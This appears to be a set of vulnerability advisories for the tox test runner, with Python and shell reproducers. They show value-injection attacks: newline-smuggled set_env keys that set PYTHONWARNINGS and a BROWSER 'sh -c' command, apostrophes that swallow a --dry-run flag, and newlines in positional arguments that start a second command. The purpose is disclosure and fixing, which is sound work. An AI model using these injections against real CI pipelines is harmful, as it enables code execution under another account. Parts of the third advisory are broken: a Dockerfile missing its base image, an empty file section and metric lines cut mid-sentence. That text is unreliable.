summary: Substituted environment key defines another variable
description:
## Summary

Substituted environment key defines another variable. Anthropic OSS Scanner reported this as ANT-2026-9621TZ2U on
2026-10-22.

## Affected area

`setenv` and `set_env` key expansion.

## Attacker-controlled input

One outside-controlled value substituted into an environment-variable assignment key. The attacker does not need to edit
the trusted tox configuration.

## Affected code

[`SetEnv._expand()` in `src/tox/config/set_env.py`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/set_env.py#L346)
at release commit `ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`.

## Mechanism

The key substitution puts a line separator into the entry. A second parse creates more variables, which run a command in
the reproducer.

## Reproduction and evidence

The reporter's reproducer returned `BUG` against release 4.67.4 in an isolated container with no network access. It also
returned `BUG` against report commit `7988418936b730b19981ba934dc8b57186d6b957` and tested main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`.

Save the Dockerfile below in the finding directory. With a source checkout at release commit
`ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`, build the test image and run:

```sh
release_checkout=/path/to/tox-4.67.4
docker build -f Dockerfile.repro -t tox-sec-4.67.4 "$release_checkout"
docker run --rm --network=none -u 0 -w /src -v "$PWD/repro:/tmp/repro:ro,z" -v "$PWD/repro.d:/tmp/repro.d:ro,z" tox-sec-4.67.4 /tmp/repro
```

```text
CONTROL  tox run -e plain     LABEL="v1\nPYTHONWARNINGS=all:0:antigravity.x:0:0\nBROWSER=sh -c 'touch /tmp/set-env-key-qvm_x8zc/injected-command-ran' %s"
CONTROL  tox run -e plain     BROWSER=None marker exists: False
OBSERVED tox run -e suffixed  LABEL_suffixed='v1'
OBSERVED tox run -e suffixed  PYTHONWARNINGS='all:0:antigravity.x:0:0'
OBSERVED tox run -e suffixed  BROWSER="sh -c 'touch /tmp/set-env-key-qvm_x8zc/injected-command-ran' %s" marker exists: True
BUG
```

### Earlier release check

The 1.0 fixture uses the old `setenv` spelling; the 4.0.0a2 fixture uses `set_env`. Run this from an empty directory
with Docker. The images pin tox and the dependencies resolved during this check, and execution has no network access.

```sh
mkdir -p historical-r863/one historical-r863/two historical-r863/four
cat > historical-r863/Dockerfile <<'DOCKER'
FROM python:3.11-slim@sha256:673719e071ecf27434fd2635bbd8d00f49f4fdd81f243143438a42ced8bedf60
ARG tox_version
ARG PIN_SET
COPY constraints-${PIN_SET}.txt /tmp/constraints.txt
RUN python -m venv /opt/venv && /opt/venv/bin/pip install -c /tmp/constraints.txt "tox==${tox_version}"
ENV PATH=/opt/venv/bin:$PATH
DOCKER
cat > historical-r863/constraints-old.txt <<'PINS'
distlib==0.4.4
filelock==4.2.5
packaging==26.3
platformdirs==4.14.0
pluggy==0.3.1
py==1.11.0
python-discovery==1.9.0
virtualenv==21.15.2
PINS
cat > historical-r863/constraints-four.txt <<'PINS'
appdirs==1.4.4
colorama==0.4.6
distlib==0.4.4
filelock==4.2.5
packaging==26.3
platformdirs==4.14.0
pluggy==1.7.0
python-discovery==1.9.0
toml==0.10.2
virtualenv==21.15.2
PINS
cat > historical-r863/one/tox.ini <<'INI'
[tox]
envlist = suffixed

[testenv:suffixed]
setenv =
    LABEL_{envname} = {env:BUILD_LABEL}
commands = python -c "pass"
INI
cp historical-r863/one/tox.ini historical-r863/two/tox.ini
cat > historical-r863/four/tox.ini <<'INI'
[tox]
no_package = true

[testenv:suffixed]
set_env =
    LABEL_{env_name} = {env:BUILD_LABEL}
commands = python -c "pass"
INI
docker build --quiet --build-arg tox_version=1.0 --build-arg PIN_SET=old \
  -t tox-historical-r863:1.0 historical-r863 > /dev/null
docker build --quiet --build-arg tox_version=2.3.0 --build-arg PIN_SET=old \
  -t tox-historical-r863:2.3.0 historical-r863 > /dev/null
docker build --quiet --build-arg tox_version=4.0.0a2 --build-arg PIN_SET=four \
  -t tox-historical-r863:4.0.0a2 historical-r863 > /dev/null
docker run --rm --network none -v "$PWD/historical-r863/one:/tmp/proj:ro,z" -w /tmp/proj \
  -e BUILD_LABEL=$'v1\nINJECTED=marker' tox-historical-r863:1.0 python -c '
from tox._config import parseconfig
c = parseconfig(["-c", "tox.ini", "-e", "suffixed"])
e = c.envconfigs["suffixed"].setenv
print({key: e.get(key) for key in ("LABEL_suffixed", "INJECTED")})'
docker run --rm --network none -v "$PWD/historical-r863/two:/tmp/proj:ro,z" -w /tmp/proj \
  -e BUILD_LABEL=$'v1\nINJECTED=marker' tox-historical-r863:2.3.0 python -c '
from tox.config import parseconfig
c = parseconfig(["-c", "tox.ini", "-e", "suffixed"])
e = dict(c.envconfigs["suffixed"].setenv)
print({key: e.get(key) for key in ("LABEL_suffixed", "INJECTED", "LABEL_{envname}")})'
docker run --rm --network none -v "$PWD/historical-r863/four:/tmp/proj:ro,z" -w /tmp/proj \
  -e BUILD_LABEL=$'v1\nINJECTED=marker' tox-historical-r863:4.0.0a2 \
  python -m tox config -e suffixed -k set_env | rg 'LABEL_suffixed|INJECTED'
```

```text
{'LABEL_suffixed': 'v1', 'INJECTED': 'marker'}
{'LABEL_suffixed': None, 'INJECTED': None, 'LABEL_{envname}': 'v1\nINJECTED=marker'}
  LABEL_suffixed=v1
  INJECTED=marker
```

The first and third results reproduce a second environment key in tox 1.0 and 4.0.0a2. The middle result shows that
2.3.0 keeps the line break in one value. The same fixture on 2.2.0 and 2.2.1 raises `RecursionError`, so those versions
are excluded from this finding. Additional positive reproductions covered 1.9.2, 2.0.0, 2.1.0, 2.1.1, 4.0.0, 4.64.6, and
4.67.4. Negative controls covered 2.3.1, 2.7.0, 2.8.0, 2.9.1, 3.28.0, and 4.67.5. Source checks across all 24 published
stable tags from 1.0 through 2.1.1 found eager substitution before line splitting; all 210 published tox 4 tags from
4.0.0a2 through 4.67.4 retain a split or reparse of substituted lines. The lowest confirmed affected release is 1.0; the
highest is 4.67.4. The affected periods are separate: 1.0 through 2.1.1 and 4.0.0a2 through 4.67.4.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Input author
    participant J as Trusted run
    participant T as tox
    participant S as set_env parser
    A->>J: provide a value containing a line separator
    J->>+T: run with the stated input
    T->>S: substitute the value into a set_env key
    Note over T,S: the second parse defines new variables used to run a command
    deactivate T
```

## Reproducer files

The `repro` and `repro.d` files below are from the reporter's finding directory. The test image contains the 4.67.4
source at `/src` and the project installed in `/opt/venv`.

**repro**

```python
#!/usr/bin/env python3
import json
import os
import shutil
import subprocess
import tempfile
from pathlib import Path

# set up: the project's tox.ini and its configured command in a fresh directory
project = Path(tempfile.mkdtemp(prefix="set-env-key-"))
shutil.copy("/tmp/repro.d/tox.ini", project)
shutil.copy("/tmp/repro.d/record_environ.py", project)
marker = project / "injected-command-ran"


def tox_run(env_name, build_label):
    """`tox run -e <env_name>` with BUILD_LABEL set; returns the environment the configured command received."""
    subprocess.run(
        ["/opt/venv/bin/tox", "run", "-qq", "-e", env_name],
        cwd=project,
        env={"PATH": os.environ["PATH"], "BUILD_LABEL": build_label},  # nothing inherited that could look injected
        check=True,
    )
    return json.loads((project / "environ.json").read_text())


# the attacker's part: the value of the host variable BUILD_LABEL
# PYTHONWARNINGS makes Python import antigravity at start-up, which opens a URL with the program named in BROWSER
injected_pythonwarnings = "all:0:antigravity.x:0:0"
injected_browser = f"sh -c 'touch {marker}' %s"
build_label = f"v1\nPYTHONWARNINGS={injected_pythonwarnings}\nBROWSER={injected_browser}"
print(f"BUILD_LABEL={build_label!r}", flush=True)

# control: literal key, `LABEL = {env:BUILD_LABEL}`
control = tox_run("plain", build_label)
control_marker = marker.exists()
print(f"CONTROL  tox run -e plain     LABEL={control.get('LABEL')!r}")
print(f"CONTROL  tox run -e plain     BROWSER={control.get('BROWSER')!r} marker exists: {control_marker}", flush=True)

# attack: the same value under a substituted key, `LABEL_{env_name} = {env:BUILD_LABEL}`
observed = tox_run("suffixed", build_label)
print(f"OBSERVED tox run -e suffixed  LABEL_suffixed={observed.get('LABEL_suffixed')!r}")
print(f"OBSERVED tox run -e suffixed  PYTHONWARNINGS={observed.get('PYTHONWARNINGS')!r}")
print(f"OBSERVED tox run -e suffixed  BROWSER={observed.get('BROWSER')!r} marker exists: {marker.exists()}")

# check: the value must stay the content of one variable, as it does under the literal key
value_stays_one_variable = control.get("LABEL") == build_label and "BROWSER" not in control and not control_marker
value_became_variables = (
    observed.get("LABEL_suffixed") == "v1"
    and observed.get("PYTHONWARNINGS") == injected_pythonwarnings
    and observed.get("BROWSER") == injected_browser
    and marker.exists()
)
print("BUG" if value_stays_one_variable and value_became_variables else "OK")
```

**repro.d/record_environ.py**

```python
"""The configured test command: save the environment tox started it with."""

import json
import os
from pathlib import Path

Path("environ.json").write_text(json.dumps(dict(os.environ)))
```

**repro.d/tox.ini**

```ini
[tox]
no_package = true

[testenv]
commands = python record_environ.py

[testenv:plain]
set_env =
    LABEL = {env:BUILD_LABEL}

[testenv:suffixed]
set_env =
    LABEL_{env_name} = {env:BUILD_LABEL}
```

**Dockerfile.repro (test harness)**

```dockerfile
FROM python:3.15-bookworm
ENV DEBIAN_FRONTEND=noninteractive \
    PIP_DISABLE_PIP_VERSION_CHECK=1

RUN apt-get update && apt-get install -y --no-install-recommends man-db passwd \
    && rm -rf /var/lib/apt/lists/* \
    && useradd --create-home --shell /bin/bash scanner-test

RUN python -m venv /opt/venv
ENV PATH=/opt/venv/bin:$PATH

COPY . /src
WORKDIR /src

RUN pip install --upgrade pip \
    && { git describe --tags >/dev/null 2>&1 || export SETUPTOOLS_SCM_PRETEND_VERSION=0.0.0; } \
    && pip install -e '.[completion]' --group test \
    && pip wheel --no-deps --wheel-dir /opt/wheels .

RUN chown -R scanner-test:scanner-test /src && git config --global --add safe.directory /src
```

## Impact

The reproduction ran attacker-controlled code under the tox account. The reproducer does not establish that a typical
tox run has this input source. Exposure is niche because the attack needs one outside-controlled value substituted into
a set_env key.

For scoring, the conditional path is a trusted CI job forwarding outside-supplied data into this setting without
granting its source access to the tox host. The reproducer does not establish that such a job is deployed.

Severity: CVSS v4.0 base 7.3 (`CVSS:4.0/AV:L/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N`). Metric reasons:

- `AV:L`: The reproducer runs tox on the host with the triggering value or path; it shows no network route into tox.
- `AC:L`: The reproducer requires no target-specific secret or evasion technique.
- `AT:P`: The trusted configuration must substitute an outside-controlled value into a `set_env` key.
- `PR:N`: The conditional outside source needs no prior privilege on the tox host.
- `UI:P`: A trusted user or job must run tox with the supplied input.
- `VC:H`: The reproduced code runs with access to the tox account's files.
- `VI:H`: The attacker-controlled code runs with the tox account's write permissions.
- `VA:L`: The attacker-controlled code can stop one tox invocation. The reproduction does not establish sustained or
  persistent denial of tox or a direct, serious availability consequence.
- `SC:N`: No other system disclosed data in the test.
- `SI:N`: The reproduction does not establish an integrity impact on a subsequent system.
- `SA:N`: The test shows no outage in another system.

## Versions tested

The reproducer confirms 4.67.4, report commit `7988418936b730b19981ba934dc8b57186d6b957`, and main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`. Against
[fix commit `590fca84773b6be050cc5a4de29a6b6728d02a6a`](https://github.com/gaborbernat/tox/commit/590fca84773b6be050cc5a4de29a6b6728d02a6a),
the same reproducer returned `OK` in a container without network access: `LABEL_suffixed` retained the multiline value,
`PYTHONWARNINGS` and `BROWSER` were absent, and the marker file was absent. The fix is in
[public PR #4265](https://github.com/tox-dev/tox/pull/4265).

[tox 4.67.5](https://github.com/tox-dev/tox/releases/tag/4.67.5) includes the fix.

Historical reproductions and source checks support two affected periods: 1.0 through 2.1.1 and 4.0.0a2 through 4.67.4.
The tested 2.2.x versions raised `RecursionError`; sampled 2.3–3.x releases did not add another key.

## Known mitigation

Keep set_env keys literal when values come from outside the project.

## Affected release

- [x] 1.0 (lowest confirmed affected)
- [x] 1.9.2
- [x] 2.0.0
- [x] 2.1.0
- [x] 2.1.1
- [x] 4.0.0a2
- [x] 4.0.0
- [x] 4.64.6
- [x] 4.67.4 (highest confirmed affected)

## Credits

Anthropic OSS Scanner, ANT-2026-9621TZ2U.

summary: Windows command reference drops a safety option
description:
## Summary

Windows command reference drops a safety option. Anthropic OSS Scanner reported this as ANT-2026-T286I4M0 on 2026-10-22.

## Affected area

Windows INI command reference expansion.

## Attacker-controlled input

One or two forwarded positional values containing apostrophes. The attacker does not need to edit the trusted tox
configuration.

## Affected code

[`shell_cmd()` in `src/tox/execute/request.py`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/execute/request.py#L90)
at release commit `ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`.

## Mechanism

An apostrophe changes quoting in a Windows INI command. The reproducer shows `--dry-run` absorbed into an argument and
an extra option split from another value. Before 4.65.6, direct commands also absorbed `--dry-run`; the partial
direct-command fix left the reference affected. See [Python shlex](https://docs.python.org/3/library/shlex.html) for
parser behavior.

## Reproduction and evidence

The reporter's reproducer returned `BUG` against release 4.67.4 in an isolated container with no network access. It also
returned `BUG` against report commit `7988418936b730b19981ba934dc8b57186d6b957` and tested main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`.

A Windows 11 run showed the referenced command receiving `"it's --dry-run"` as one argument, where the direct command
received `"it's"` and `"--dry-run"` separately.

Save the Dockerfile below in the finding directory. With a source checkout at release commit
`ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`, build the test image and run:

```sh
release_checkout=/path/to/tox-4.67.4
docker build -f Dockerfile.repro -t tox-sec-4.67.4 "$release_checkout"
docker run --rm --network=none -u 0 -w /src -v "$PWD/repro:/tmp/repro:ro,z" -v "$PWD/repro.d:/tmp/repro.d:ro,z" tox-sec-4.67.4 /tmp/repro
```

```text
CONTROL  -e check   -- ["it's"] -> ["it's", "--dry-run"]
OBSERVED -e release -- ["it's"] -> ["it's --dry-run"]
CONTROL  -e check   -- ["--title", "'", "--notes", "x y' --force 'z"] -> ["--title", "'", "--notes", "x y' --force 'z", "--dry-run"]
OBSERVED -e release -- ["--title", "'", "--notes", "x y' --force 'z"] -> ["--title", " --notes \"x y", "--force", "'z\" --dry-run"]
BUG
```

### Earlier release check

I ran this on Windows 11 with Python 3.11.17 and uv 0.13.0. Each `uv run` command pins the tox version. The fixture
records the arguments received by the configured command.

```powershell
New-Item -ItemType Directory -Force -Path .\historical-mr49 | Out-Null
Set-Location .\historical-mr49
@"
[tox]
no_package = true

[testenv]
commands = python record_argv.py {posargs} --dry-run

[testenv:check]

[testenv:release]
commands = {[testenv:check]commands}
"@ | Set-Content -Encoding Ascii tox.ini
@"
import json
import sys
from pathlib import Path

Path("argv.json").write_text(json.dumps(sys.argv[1:]))
"@ | Set-Content -Encoding Ascii record_argv.py
foreach ($version in @("4.3.5", "4.4.0", "4.65.6", "4.67.5")) {
    foreach ($name in @("check", "release")) {
        uv run --no-project --python 3.11 --with "tox==$version" tox -c tox.ini run -e $name -- `
            ("it" + [char]39 + "s") | Out-Null
        if ($LASTEXITCODE -ne 0) { throw "tox $version $name failed" }
        Write-Output "$version $name $(Get-Content .\argv.json)"
    }
}
```

```text
4.3.5 check ["it's", "--dry-run"]
4.3.5 release ["it's", "--dry-run"]
4.4.0 check ["it's --dry-run"]
4.4.0 release ["it's --dry-run"]
4.65.6 check ["it's", "--dry-run"]
4.65.6 release ["it's --dry-run"]
4.67.5 check ["it's", "--dry-run"]
4.67.5 release ["it's", "--dry-run"]
```

The safety option is absorbed in the referenced command from 4.4.0. Through 4.65.5, the direct command also absorbs it;
4.65.6 repaired the direct command but left the reference affected. Source checks found the same Windows POSIX shlex
call in all 155 stable tags from 4.4.0 through 4.67.4. The lowest confirmed affected release is 4.4.0, and the highest
is 4.67.4. Version 4.67.5 keeps `--dry-run` separate.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Input author
    participant J as Trusted run
    participant T as tox
    participant S as Windows command parser
    A->>J: provide a positional value containing an apostrophe
    J->>+T: run with the stated input
    T->>S: expand the referenced INI command
    Note over T,S: the dry-run option is absorbed into an argument
    deactivate T
```

## Reproducer files

The `repro` and `repro.d` files below are from the reporter's finding directory. The test image contains the 4.67.4
source at `/src` and the project installed in `/opt/venv`.

**repro**

```python
#!/usr/bin/env python3
import json
import os
import shutil
import subprocess
import tempfile
from pathlib import Path

# set up: the owner's project; env `check` owns `python record_argv.py {posargs} --dry-run`,
# env `release` runs the same line through `{[testenv:check]commands}`
project = Path(tempfile.mkdtemp())
shutil.copy("/tmp/repro.d/tox.ini", project)
shutil.copy("/tmp/repro.d/record_argv.py", project)
# no Windows in the image: starts tox with the win32 branches of its three command-text modules
tox_on_windows = ["/opt/venv/bin/python", "/tmp/repro.d/tox_with_win32_branches.py"]
env = {**os.environ, "VIRTUALENV_NO_PERIODIC_UPDATE": "1"}


def spawned_argv(tox_env, posargs):
    (project / "argv.json").unlink(missing_ok=True)
    tox = [*tox_on_windows, "run", "-e", tox_env, "--", *posargs]
    subprocess.run(tox, cwd=project, env=env, check=True, capture_output=True)
    return json.loads((project / "argv.json").read_text())


# attack: values a pipeline forwards after `--`
one_value = ["it's"]
two_values = ["--title", "'", "--notes", "x y' --force 'z"]

direct_one = spawned_argv("check", one_value)
referred_one = spawned_argv("release", one_value)
direct_two = spawned_argv("check", two_values)
referred_two = spawned_argv("release", two_values)

print(f"CONTROL  -e check   -- {json.dumps(one_value)} -> {json.dumps(direct_one)}")
print(f"OBSERVED -e release -- {json.dumps(one_value)} -> {json.dumps(referred_one)}")
print(f"CONTROL  -e check   -- {json.dumps(two_values)} -> {json.dumps(direct_two)}")
print(f"OBSERVED -e release -- {json.dumps(two_values)} -> {json.dumps(referred_two)}")

# check: both envs run the owner's one line, so both must get each value, then --dry-run, as separate arguments
controls_intact = direct_one == [*one_value, "--dry-run"] and direct_two == [*two_values, "--dry-run"]
dry_run_swallowed = "--dry-run" not in referred_one
force_split_out = "--force" in referred_two
print(
    f"controls intact: {controls_intact}; --dry-run swallowed: {dry_run_swallowed}; --force split out of --notes: {force_split_out}"
)
print("BUG" if controls_intact and dry_run_swallowed and force_split_out else "OK")
```

**repro.d/record_argv.py**

```python
import json
import sys
from pathlib import Path

Path("argv.json").write_text(json.dumps(sys.argv[1:]))
```

**repro.d/tox.ini**

```ini
[tox]
no_package = true

[testenv]
commands = python record_argv.py {posargs} --dry-run

[testenv:check]

[testenv:release]
commands = {[testenv:check]commands}
```

**repro.d/tox_with_win32_branches.py**

```python
import sys

import tox.config.loader.replacer
import tox.config.loader.str_convert
import tox.execute.request
from tox.run import run


class SysOnWindows:
    platform = "win32"

    def __getattr__(self, name):
        return getattr(sys, name)


# the only modules between tox.ini and the spawned argv that ask for sys.platform; their win32 branches are string code
tox.config.loader.replacer.sys = SysOnWindows()  # _quote_pos_args: {posargs} -> command text
tox.config.loader.str_convert.sys = SysOnWindows()  # StrConvert.to_command: command text -> argv
tox.execute.request.sys = SysOnWindows()  # shell_cmd (list2cmdline): argv -> command text

run()
```

**Dockerfile.repro (test harness)**

```dockerfile
FROM python:3.15-bookworm
ENV DEBIAN_FRONTEND=noninteractive \
    PIP_DISABLE_PIP_VERSION_CHECK=1

RUN apt-get update && apt-get install -y --no-install-recommends man-db passwd \
    && rm -rf /var/lib/apt/lists/* \
    && useradd --create-home --shell /bin/bash scanner-test

RUN python -m venv /opt/venv
ENV PATH=/opt/venv/bin:$PATH

COPY . /src
WORKDIR /src

RUN pip install --upgrade pip \
    && { git describe --tags >/dev/null 2>&1 || export SETUPTOOLS_SCM_PRETEND_VERSION=0.0.0; } \
    && pip install -e '.[completion]' --group test \
    && pip wheel --no-deps --wheel-dir /opt/wheels .

RUN chown -R scanner-test:scanner-test /src && git config --global --add safe.directory /src
```

## Impact

On Windows an apostrophe in a forwarded argument absorbs --dry-run through an INI command reference. The reproduction
does not establish a wider effect. Exposure is niche because the attack needs one or two forwarded positional values
containing apostrophes.

For scoring, the conditional path is a trusted CI job forwarding outside-supplied data into this setting without
granting its source access to the tox host. The reproducer does not establish that such a job is deployed.

summary: Positional value starts another configured command
description:
## Summary

A line break in one positional value can start another INI command when a trusted configuration uses `{posargs}` or
references a generated command. Anthropic OSS Scanner reported this as ANT-2026-GWQ8RBX8 on 2026-10-22.

## Affected area

INI command text built from positional values, including generated command references.

## Attacker-controlled input

One positional value containing a line separator. The attacker does not need to edit the trusted tox configuration.

## Affected code

At release commit `ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`,
[`_quote_pos_args()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/replacer.py#L306-L316)
and
[`stringify(Command)`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/stringify.py#L30-L34)
preserved line breaks inside positional values.
[`StrConvert.to_list()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/str_convert.py#L37-L43)
split the resulting INI text into commands.

## Mechanism

`_quote_pos_args()` kept line breaks when it quoted forwarded positional values. A reference to a generated PEP 723
command took another path: `stringify(Command)` rendered its arguments with their line breaks. `StrConvert.to_list()`
split either result at `\n` before [shlex](https://docs.python.org/3/library/shlex.html) parsed the command, so the
remainder of one value became another command entry.

## Reproduction and evidence

The reporter's reproducer returned `BUG` against release 4.67.4 in an isolated container with no network access. It also
returned `BUG` against report commit `7988418936b730b19981ba934dc8b57186d6b957` and tested main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`.

The additional `repro-exec` file changed the injected line to `python -c "print(987654321)"`; the release run printed
that value from a second command. Mount `repro-exec` at `/tmp/repro` to repeat this check.

Save the Dockerfile below in the finding directory. With a source checkout at release commit
`ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`, build the test image and run:

```sh
release_checkout=/path/to/tox-4.67.4
docker build -f Dockerfile.repro -t tox-sec-4.67.4 "$release_checkout"
docker run --rm --network=none -u 0 -w /src -v "$PWD/repro:/tmp/repro:ro,z" -v "$PWD/repro.d:/tmp/repro.d:ro,z" tox-sec-4.67.4 /tmp/repro
```

```text
CONTROL  tox.toml started: [['--ref', 'main\npython record_argv.py INJECTED-SECOND-COMMAND\n']]
OBSERVED tox.ini  started: [['--ref', "'main"], ['INJECTED-SECOND-COMMAND']]
BUG
venv: commands[1]> python -c 'print(987654321)'
987654321
BUG
```

### Earlier release check

This check uses the INI path, which exists in both alphas. It runs in Docker with tox and the resolved dependencies
pinned; the test containers have no network access. Run from an empty directory.

```sh
mkdir -p historical-rwp2/a7 historical-rwp2/a8
cat > historical-rwp2/Dockerfile <<'DOCKER'
FROM python:3.11-slim@sha256:673719e071ecf27434fd2635bbd8d00f49f4fdd81f243143438a42ced8bedf60
ARG tox_version
COPY constraints.txt /tmp/constraints.txt
RUN python -m venv /opt/venv && /opt/venv/bin/pip install -c /tmp/constraints.txt "tox==${tox_version}"
ENV PATH=/opt/venv/bin:$PATH
DOCKER
cat > historical-rwp2/constraints.txt <<'PINS'
cachetools==7.2.7
chardet==7.7.0
colorama==0.4.6
distlib==0.4.4
filelock==4.2.5
packaging==26.3
platformdirs==4.14.0
pluggy==1.7.0
python-discovery==1.9.0
tomli==2.5.0
virtualenv==21.15.2
PINS
cat > historical-rwp2/tox.ini <<'INI'
[tox]
no_package = true

[testenv:venv]
commands = {posargs}
INI
cat > historical-rwp2/record_argv.py <<'PY'
import json
import sys
from pathlib import Path

with Path("spawned.jsonl").open("a") as log:
    log.write(json.dumps(sys.argv[1:]) + "\n")
PY
for version in a7 a8; do
  cp historical-rwp2/{Dockerfile,constraints.txt,tox.ini,record_argv.py} "historical-rwp2/$version/"
done
docker build --quiet --build-arg tox_version=4.0.0a7 \
  -t tox-historical-rwp2:4.0.0a7 historical-rwp2/a7 > /dev/null
docker build --quiet --build-arg tox_version=4.0.0a8 \
  -t tox-historical-rwp2:4.0.0a8 historical-rwp2/a8 > /dev/null
docker run --rm --network none -v "$PWD/historical-rwp2/a7:/tmp/proj:z" -w /tmp/proj \
  tox-historical-rwp2:4.0.0a7 python -m tox run -c tox.ini -e venv -- \
  python record_argv.py --ref $'main\npython record_argv.py INJECTED-SECOND-COMMAND\n' 2>&1 | rg 'ValueError:'
test ! -e historical-rwp2/a7/spawned.jsonl && echo 'a7 started no record_argv.py process'
docker run --rm --network none -v "$PWD/historical-rwp2/a8:/tmp/proj:z" -w /tmp/proj \
  tox-historical-rwp2:4.0.0a8 python -m tox run -c tox.ini -e venv -- \
  python record_argv.py --ref $'main\npython record_argv.py INJECTED-SECOND-COMMAND\n' 2>&1 | rg 'commands\[1\]'
cat historical-rwp2/a8/spawned.jsonl
```

```text
ValueError: No closing quotation
a7 started no record_argv.py process
venv: commands[1] .> python record_argv.py INJECTED-SECOND-COMMAND
["--ref", "'main"]
["INJECTED-SECOND-COMMAND"]
```

The 4.0.0a7 parser rejects the value before starting the configured command. Version 4.0.0a8 starts a second command
from the line break. Source checks found command newline splitting in all 204 published versions from 4.0.0a8 through
4.67.4. The first affected prerelease is 4.0.0a8, the first affected stable release is 4.0.0, and the highest confirmed
affected release is 4.67.4. Version 4.67.5 starts one process for this input.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Input author
    participant J as Trusted run
    participant T as tox command renderer
    participant S as INI command parser
    participant E as Command executor
    A->>J: provide a positional value containing a line separator
    J->>+T: run with the stated input
    alt config uses posargs
        T->>T: quote the value with its line break
    else config references a generated command
        T->>T: render the command with its line break
    end
    rect rgb(255, 214, 214)
        T->>+S: send command text containing the line break
        S-->>T: return a second command entry
        deactivate S
        T->>+E: start the second command
        E-->>T: return its result
        deactivate E
    end
    deactivate T
```

## Reproducer files

The `repro` and `repro.d` files below are from the reporter's finding directory. The test image contains the 4.67.4
source at `/src` and the project installed in `/opt/venv`.

**repro**

```python
#!/usr/bin/env python3
import json
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

REPRO_D = Path("/tmp/repro.d")


def make_project(config_file):
    project = Path(tempfile.mkdtemp(prefix="tox-project-"))
    shutil.copy(REPRO_D / config_file, project)
    shutil.copy(REPRO_D / "record_argv.py", project)
    return project


def spawned_processes(project):
    return [json.loads(line) for line in (project / "spawned.jsonl").read_text().splitlines()]


# set up: the same one-environment project, once as tox.ini and once as tox.toml
ini_project = make_project("tox.ini")
toml_project = make_project("tox.toml")

# the CI job fixes the command and forwards one outside value as a single argument after --ref
ci_command = ["tox", "run", "-e", "venv", "--", "python", "record_argv.py", "--ref"]
injected_command = "python record_argv.py INJECTED-SECOND-COMMAND"
# the trailing newline leaves the closing quote that tox adds on a line of its own
hostile_value = "main\n" + injected_command + "\n"

# control: tox.toml passes the value to one process as one argument
subprocess.run([*ci_command, hostile_value], cwd=toml_project, capture_output=True, check=True)
toml_processes = spawned_processes(toml_project)
print("CONTROL  tox.toml started:", toml_processes)
if toml_processes != [["--ref", hostile_value]]:
    sys.exit("control failed: tox.toml did not start exactly one process with the value as one argument")

# attack: the same command line against tox.ini
ini_run = subprocess.run([*ci_command, hostile_value], cwd=ini_project, capture_output=True, text=True)
print(ini_run.stdout)
ini_processes = spawned_processes(ini_project)
print("OBSERVED tox.ini  started:", ini_processes)

# check: a single argument must never start a process of its own
print("BUG" if ["INJECTED-SECOND-COMMAND"] in ini_processes else "OK")
```

**repro.d/record_argv.py**

```python
import json
import sys
from pathlib import Path

# one line per process started: its arguments
with (Path(__file__).parent / "spawned.jsonl").open("a") as log:
    log.write(json.dumps(sys.argv[1:]) + "\n")
```

**repro.d/tox.ini**

```ini
[tox]
no_package = true

# run a command given on the command line inside the environment: tox run -e venv -- <command> <arguments>
[testenv:venv]
commands = {posargs}
```

**repro.d/tox.toml**

```toml
no_package = true

# the same environment as tox.ini: tox run -e venv -- <command> <arguments>
[env.venv]
commands = [[{ replace = "posargs", extend = true }]]
```

**repro-exec (additional code execution check)**

**Dockerfile.repro (test harness)**

```dockerfile

ENV DEBIAN_FRONTEND=noninteractive \
    PIP_DISABLE_PIP_VERSION_CHECK=1

RUN apt-get update && apt-get install -y --no-install-recommends man-db passwd \
```

## Impact

The reproduction ran attacker-controlled code under the tox account. The reproducer does not establish that a typical
tox run has this input source. Exposure is niche because the attack needs one positional value containing a line
separator.

For scoring, the conditional path is a trusted CI job forwarding outside-supplied data into this setting without
granting its source access to the tox host. The reproducer does not establish that such a job is deployed.

Severity: CVSS v4.0 base 7.3 (`CVSS:4.0/AV:L/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N`). Metric reasons:

- `AV:L`: The reproducer runs tox on the host with the triggering value or path; it shows no network route into tox.
- `AC:L`: The reproducer requires no target-specific secret or evasion technique.
- `AT:P`: The trusted command must use the affected positional expansion while an outside-controlled value contains a
  line separator.
- `PR:N`: The conditional outside source needs no prior privilege on the tox host.
- `UI:P`: A trusted user or job must run tox with the supplied input.
- `VC:H`: The reproduced code runs with access to the tox account's files.
- `VI:H`: The attacker-controlled code runs with the tox account's write permissions.

  outage. [FIRST's CVSS v4.0 definition](https://www.first.org/cvss/v4.0/specification-document) reserves `VA:H` for a
  total, sustained loss or a direct, serious consequence.
- `SC:N`: No other system disclosed data in the test.
- `SI:N`: The reproduction does not establish an integrity impact on a subsequent system.
- `SA:N`: The test shows no outage in another system.

## Versions tested

`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`. With [PR #4294](https://github.com/tox-dev/tox/pull/4294) at

summary: Cyclic value expansion stalls a tox run
description:
## Summary

Cyclic value expansion stalls a tox run. Anthropic OSS Scanner reported this as ANT-2026-XJHQS1ML on 2026-10-22.

## Affected area

Configuration reference expansion.

## Attacker-controlled input

One outside-controlled value that reaches an INI reference or TOML string. The attacker does not need to edit the
